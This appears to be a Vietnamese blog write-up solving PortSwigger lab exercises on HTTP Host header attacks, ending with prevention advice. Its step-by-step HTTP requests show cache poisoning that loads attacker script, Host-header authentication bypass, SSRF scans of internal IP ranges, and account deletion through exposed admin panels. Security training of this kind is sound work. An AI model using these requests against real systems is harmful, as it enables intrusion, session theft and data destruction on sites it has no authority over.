---
title: "[PortSwigger Lab] - HTTP Host Header Attacks"
description: Solution of HTTP Host Header Attacks Lab
date: 2025-06-17 21:30:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, http host header]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-17-portswigger-lab-http-host-header-attacks/http-host-header-attacks.png
    alt: HTTP Host Header Attacks
---

## Introduction
---
### **HTTP Host Header**
**HTTP Host Header** là một phần bắt buộc trong **request HTTP** từ phiên bản `HTTP/1.1` trở lên. Nó dùng để xác định **domain** mà **client (trình duyệt, công cụ HTTP, v.v.)** muốn truy cập đến.

### What is the purpose of the HTTP Host header?
1. Vì nhiều **website** có thể dùng chung **1 IP (Virtual Hosting)**
    - Ngày xưa: mỗi **IP** chỉ phục vụ **1 website** → không cần **Host header**.
    - Ngày nay: do thiếu địa chỉ **IPv4**, nhiều **website** chia sẻ cùng **1 IP**.
    - Máy chủ cần biết **client** muốn **website** nào → dùng **Host: domain**.
2. Vì có các hệ thống trung gian **(Load balancer, Reverse proxy, CDN)**
    - Một **CDN** như **Cloudflare** có thể phục vụ hàng ngàn **domain** qua cùng **1 IP**.
    - **CDN/Proxy** sẽ nhìn vào **Host header** để biết cần chuyển **request** đến **server** nào phía sau.

### **HTTP Host Header Attacks**
Là kiểu tấn công xảy ra khi máy chủ xử lý giá trị **Host** từ client một cách không an toàn – cụ thể là tin tưởng hoàn toàn vào giá trị đó mà không xác thực hoặc lọc dữ liệu.

## Solve HTTP Host Header Attacks
---
### Lab: Web cache poisoning via ambiguous requests
#### Analysis
- Truy cập website và gửi request đến **Burp Repeater**

Request:
```http
GET / HTTP/1.1
Host: 0a61000603dc04fc81cf0c18003d00d2.h1-web-security-academy.net
Cookie: session=JPIEPv1TmARu0keE0JDXX8DGmuPj1XfO; _lab=46%7cMCwCFF9K2kIxeI1yCHNUVwFAW9vybgdmAhQmfwYLPKGO4eeTqkBKOY54DtYNMQGlkIiEj6Mi2ame%2fSNOnHQbyNVRVaaJLfWbHCOZ9AVszrlNPZl%2b0SvUOMpkhuyJp0X7yJ0dLbo99uO7v5mAs6yZc0qk2oU8yFG1fyxKrfk7jPMZyxgeT4Y%3d
```

Response:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 13971
...
<script type="text/javascript" src="//0a61000603dc04fc81cf0c18003d00d2.h1-web-security-academy.net/resources/js/tracking.js"></script>
```

- Ta thấy giá trị **header** `X-Cache: miss` là một **custom header** được thêm bởi **web cache**, **CDN**, hoặc **reverse proxy**
- Gửi lại request => **header** `X-Cache: hit` tức đã lấy kết quả truy cập từ **web cache**
- **Web cache** được sử dụng để lưu trữ tạm thời các tài nguyên đã được truy cập trước đó, với mục tiêu
    - Tăng tốc độ truy cập cho người dùng (không cần tải lại từ server gốc).
    - Giảm tải cho máy chủ gốc (backend).
    - Tiết kiệm băng thông.
    - Cải thiện khả năng mở rộng (scalability) của hệ thống.

| Header          | Ý nghĩa chính                                          |
| --------------- | ------------------------------------------------------ |
| `X-Cache: MISS` | Request không có sẵn trong cache, được gửi đến backend |
| `X-Cache: HIT`  | Request được phục vụ từ cache (nhanh hơn)              |

Quan sát response ta thấy 

```html
<script type="text/javascript" src="//0a61000603dc04fc81cf0c18003d00d2.h1-web-security-academy.net/resources/js/tracking.js"></script>
```
- Thử thay đổi **Host** thành `xnxx.com`, ta nhận được

```html
<html>
    <head>
        <title>Server Error: Gateway Timeout</title>
    </head>
    <body>
        <h1>Server Error: Gateway Timeout (1) connecting to xnxx.com</h1>
    </body>
</html>
```
- Thử thêm **Host** `xnxx.com` phía dưới **Host** gốc => Thành công, ứng dụng chọn **Host** thứ `2`
- Gửi thêm lần nữa để nhận dược `X-Cache: hit` => **poison web cache** => client tải tài nguyên từ web cache 
- Quan sát response ta thấy

```html
<script type="text/javascript" src="//xnxx.com/resources/js/tracking.js"></script>
```
- Ứng dụng trả về **resource** từ **web cache** 
- Ta có thể tạo ra resource từ server của mình đề client tải về và chạy mã độc

#### Exploit
- Đến **Exploit server**, dán vào **body** payload sau:

```js
alert(document.cookie)
```

- Thay đổi địa chỉ của `File` thành `/resources/js/tracking.js`
- Thêm **Host** `exploit-0ad600c0035b046f813c0b9b0169009c.exploit-server.net` phía dưới **Host** chính và gửi cho đến khi `X-Cache: hit`
- Qua sát response ta thấy

```html
<script type="text/javascript" src="//exploit-0ad600c0035b046f813c0b9b0169009c.exploit-server.net/resources/js/tracking.js"></script>
```
- Khi **client** truy cập vào trang web, tài nguyên sẽ được tải từ **web cache**, tuy nhiên nó đã bị đầu độc, client sẽ tải và chạy `exploit-0ad600c0035b046f813c0b9b0169009c.exploit-server.net/resources/js/tracking.js` từ **exploit server**

### Lab: Host header authentication bypass
- Truy cập `/robots.txt` để kiếm tra có đường dẫn ẩn nào không => `Disallow: /admin`
- Truy cập vào trang `/admin`, ta nhận được `Admin interface only available to local users` => Yêu cấu `Host: localhost`
- Thay đổi `Host: localhost` và gửi lại request => Truy cập được trang `admin`
- Quan sát, có đường dẫn để xóa user `carlos`
- Gửi request để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

### Lab: Routing-based SSRF
#### Analysis
- Truy cập và gửi request đến **Burp Repeater**
- Thử thay đổi host đến **Burp Collaborator** => Nhận được request => **SSRF**

```http
GET / HTTP/2
Host: qgac569v2hwna38z7s3lke4mud04oucj.oastify.com
Cookie: session=QLNblqLEK7nsbhuynQHtSQJr9Puhna3v; _lab=46%7cMCwCFGd%2bPV1D3eLyZjEI%2fjxzXeGUNJK6AhQTvUjio0HEtF5QY4Q8fStoL%2bTT6T3zPYcKcgqTR1XIeLVFg5GueLoUtpf%2bvT2qiu0yU70Um5oe%2bDjWt9rt27xA9rDGS0%2b0%2fJhGPjf%2fbfZVjtXKhFmkyEamHdTUOqyOemM9Igwvqq72Guo%3d
```
- Ta sẽ khai thác để truy cập vào vùng nội bộ của ứng dụng

#### Exploit
- Gửi request đến **Burp Intruder** để tự động hóa quá trình tấn công

```http
GET / HTTP/2
Host: 192.168.0.0
Cookie: session=QLNblqLEK7nsbhuynQHtSQJr9Puhna3v; _lab=46%7cMCwCFGd%2bPV1D3eLyZjEI%2fjxzXeGUNJK6AhQTvUjio0HEtF5QY4Q8fStoL%2bTT6T3zPYcKcgqTR1XIeLVFg5GueLoUtpf%2bvT2qiu0yU70Um5oe%2bDjWt9rt27xA9rDGS0%2b0%2fJhGPjf%2fbfZVjtXKhFmkyEamHdTUOqyOemM9Igwvqq72Guo%3d
```
- Add tại 0 của `octec 4`
- **Payload type:** `Numbers`, from `0` to `255` step `1`
- Tất chức năng **update Host Header**
- **Start attack** và kiểm tra **response** xem response trả về `status code: 302` là chính xác

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
- Ta thấy response trả về `/admin`
- Gửi request đến **Burp Repeater** và truy cập trang `/admin`

```http
GET /admin HTTP/2
Host: 192.168.0.41
Cookie: session=QLNblqLEK7nsbhuynQHtSQJr9Puhna3v; _lab=46%7cMCwCFGd%2bPV1D3eLyZjEI%2fjxzXeGUNJK6AhQTvUjio0HEtF5QY4Q8fStoL%2bTT6T3zPYcKcgqTR1XIeLVFg5GueLoUtpf%2bvT2qiu0yU70Um5oe%2bDjWt9rt27xA9rDGS0%2b0%2fJhGPjf%2fbfZVjtXKhFmkyEamHdTUOqyOemM9Igwvqq72Guo%3d
```
- Quan sát **response** ta thấy **form delete user** thông qua **username**

```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="oVxQgTdDtvYfdGvMgX2QRIdjYU8kTZDl">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```
- Gửi request theo yêu cầu **POST** trên để xóa user `carlos`, thực ra ở đây sài **GET** cũng được

```http
GET /admin/delete?username=admin&csrf=oVxQgTdDtvYfdGvMgX2QRIdjYU8kTZDl HTTP/2
Host: 192.168.0.41
Cookie: session=QLNblqLEK7nsbhuynQHtSQJr9Puhna3v; _lab=46%7cMCwCFGd%2bPV1D3eLyZjEI%2fjxzXeGUNJK6AhQTvUjio0HEtF5QY4Q8fStoL%2bTT6T3zPYcKcgqTR1XIeLVFg5GueLoUtpf%2bvT2qiu0yU70Um5oe%2bDjWt9rt27xA9rDGS0%2b0%2fJhGPjf%2fbfZVjtXKhFmkyEamHdTUOqyOemM9Igwvqq72Guo%3d
```

### Lab: SSRF via flawed request parsing
#### Analysis
- Truy cập và gửi request đến **Burp Repeater**
- Thử thay đổi host đến **Burp Collaborator** => `Forbiden`
- Thử thay đổi request thành:

```http
GET https://0ac300ef04c7433080b694ea009200ba.web-security-academy.net/ HTTP/2
Host: pyrbn5rukgems2qyprlk2dmlcci36zuo.oastify.com
Cookie: session=q1abL5vxZOdiO7jsYdnXW1bw4Bg3hHqW; _lab=46%7cMCwCFAzX%2bVxklDNrkBlAFukNBtvGo2xpAhQ%2bty%2byffEp1T3LMlO6Fn%2b4Pdru2VCZVgGX3gP72Z7lkM0GJCNPHzQtdkkaeJNhjsbusetfUrseuCFqzW%2bvtHFsh2dU1KJbRHbuo12BcMyia6pqVPQ973stth4qYpo5z0va%2fw7K5Hc0aCc%3d
```
- Không bị lỗi `Forbiden`, **Poll now** trong **Burp Collaborator** => Có request gửi đến => **SSRF** => vì **middleware** đang kiểm tra **URL** trong dòng **request (absolute URL)**, chứ không còn kiểm tra **Host header**.

#### Exploit
- Gửi request đến **Burp Intruder** để tự động hóa quá trình tấn công

```http
GET https://0ac300ef04c7433080b694ea009200ba.web-security-academy.net/ HTTP/2
Host: 192.168.0.0
Cookie: session=q1abL5vxZOdiO7jsYdnXW1bw4Bg3hHqW; _lab=46%7cMCwCFAzX%2bVxklDNrkBlAFukNBtvGo2xpAhQ%2bty%2byffEp1T3LMlO6Fn%2b4Pdru2VCZVgGX3gP72Z7lkM0GJCNPHzQtdkkaeJNhjsbusetfUrseuCFqzW%2bvtHFsh2dU1KJbRHbuo12BcMyia6pqVPQ973stth4qYpo5z0va%2fw7K5Hc0aCc%3d
```

- Add tại 0 của `octec 4`
- **Payload type:** `Numbers`, from `0` to `255` step `1`
- Tất chức năng **update Host Header**
- **Start attack** và kiểm tra **response** xem response trả về `status code: 302` là chính xác

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
- Ta thấy response trả về `/admin`
- Gửi request đến **Burp Repeater** và truy cập trang `/admin`

```http
GET https://0ac300ef04c7433080b694ea009200ba.web-security-academy.net/admin HTTP/2
Host: 192.168.0.152
Cookie: session=q1abL5vxZOdiO7jsYdnXW1bw4Bg3hHqW; _lab=46%7cMCwCFAzX%2bVxklDNrkBlAFukNBtvGo2xpAhQ%2bty%2byffEp1T3LMlO6Fn%2b4Pdru2VCZVgGX3gP72Z7lkM0GJCNPHzQtdkkaeJNhjsbusetfUrseuCFqzW%2bvtHFsh2dU1KJbRHbuo12BcMyia6pqVPQ973stth4qYpo5z0va%2fw7K5Hc0aCc%3d
```
- Quan sát **response** ta thấy **form delete user** thông qua **username**

```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="iXMPRUNbhPJ0CW4ysPZUHWbgpfYQnjaR">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```
- Gửi request theo yêu cầu **POST** trên để xóa user `carlos`, thực ra ở đây sài **GET** cũng được

```http
GET https://0ac300ef04c7433080b694ea009200ba.web-security-academy.net/admin/delete?username=carlos&csrf=iXMPRUNbhPJ0CW4ysPZUHWbgpfYQnjaR HTTP/2
Host: 192.168.0.152
Cookie: session=q1abL5vxZOdiO7jsYdnXW1bw4Bg3hHqW; _lab=46%7cMCwCFAzX%2bVxklDNrkBlAFukNBtvGo2xpAhQ%2bty%2byffEp1T3LMlO6Fn%2b4Pdru2VCZVgGX3gP72Z7lkM0GJCNPHzQtdkkaeJNhjsbusetfUrseuCFqzW%2bvtHFsh2dU1KJbRHbuo12BcMyia6pqVPQ973stth4qYpo5z0va%2fw7K5Hc0aCc%3d
```

### Lab: Host validation bypass via connection state attack
#### Analysis
- Truy cập trang, gửi request đến **Burp Repeater**
- Gửi request đến `/admin` với **Host** `192.168.0.1` => bị redirect về trang chủ => Vì server đã từ chối do request này không đến từ mạng nội bộ, hoặc kiểm tra sai vị trí trong chuỗi xử lý.

```http
GET /admin HTTP/1.1
Host: 192.168.0.1
```

```
HTTP/1.1 301 Moved Permanently
Location: https://0a69000d03c461cd80745864007300b3.h1-web-security-academy.net/
Connection: close
Keep-Alive: timeout=10
Content-Length: 0
```

#### Exploit
- Từ request đó `Ctrl + R` hoặc chuột phải `Send to Repeater` để tạo thêm request như vậy
- Tạo group gồm **2 tab (2 request)** dùng chung một kết nối
- Request đầu tiên tạo kết nối bình thường (qua domain hợp lệ)
- Request thứ hai dùng lại kết nối đó nhưng chuyển **Host** thành `192.168.0.1` → để bypass kiểm tra mạng nội bộ.

```http
GET / HTTP/1.1
Host: 0a69000d03c461cd80745864007300b3.h1-web-security-academy.net
```

```http
GET /admin HTTP/1.1
Host: 192.168.0.1
```
- Tạo group:
    - **Click** vào `⋮` góc phải bên cạnh biểu tượng kính lúp
    - **Create tab group**
    - Chọn 2 request tab ở **repeater**
- **Click** vào ký tự `⌄`, chọn **Send to group in sequence (single connection)** rồi click vào nó để gửi
- Quan sát **response** ta thấy **form delete user** thông qua **username**

```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="wUI2gIEtIrDcXYQmErfi3xVvz0AgZM3n">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```
- Gửi request theo yêu cầu **POST** trên để xóa user `carlos`, thực ra ở đây sài **GET** cũng được  

```http
GET /admin/delete?username=carlos&csrf=wUI2gIEtIrDcXYQmErfi3xVvz0AgZM3n HTTP/1.1
Host: 192.168.0.1
```

## Prevent
--- 
1. Không dùng Host để tạo URL tuyệt đối khi không cần thiết
    - Dùng URL tương đối (/reset-password) thay vì https://example.com/reset-password
    - Tránh `$_SERVER['HTTP_HOST']`, `request.get_host()`, `v.v`.

2. Cấu hình **domain** một cách thủ công trong **code/server**
    - Lưu **domain** thật trong **file config** hoặc biến môi trường
    - Khi cần tạo **link**, dùng giá trị từ **config**, không lấy từ **request**

3. Kiểm tra và lọc **Host header**
    - So sánh **Host** với danh sách **domain** hợp lệ **(whitelist)**

4. Tắt hoặc kiểm tra kỹ các **header** phụ trợ như:
    - **X-Forwarded-Host**
    - **X-Host**
    - **Forwarded**

5. Phân tách hệ thống nội bộ khỏi **public**
    - Không chạy cả app nội bộ lẫn app **public** trên cùng 1 **server/VM**
    - Tránh để **attacker** lợi dụng **Host: internal.example.local** để truy cập dịch vụ ẩn

---
Goodluck! 🍀🍀🍀 


